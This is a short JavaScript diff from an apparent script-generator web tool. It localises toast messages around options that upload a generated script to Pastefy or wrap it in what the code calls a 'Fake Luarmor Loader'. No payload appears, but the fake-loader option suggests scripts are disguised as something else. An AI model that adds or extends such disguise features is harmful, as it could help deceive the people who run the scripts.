+  if(usePastefy){try{script=await uploadToPastefy(script);showToast(t("toastPastefy"));}catch(e){showToast("❌ Pastefy: "+e.message);document.getElementById("scriptOutput").textContent=script;document.getElementById("result").classList.add("show");saveLoggedUserState();return;}}
 
   const useFakeLuarmor = document.getElementById("toggleFakeLuarmor").checked;
   if(useFakeLuarmor){
     try{
       script = await uploadToFakeLuarmor(script);
-      showToast("✅ Fake Luarmor Loader");
+      showToast(t("toastFakeLuarmor"));
     }catch(e){
       showToast("❌ Fake Luarmor: " + e.message);
       document.getElementById("scriptOutput").textContent = script;
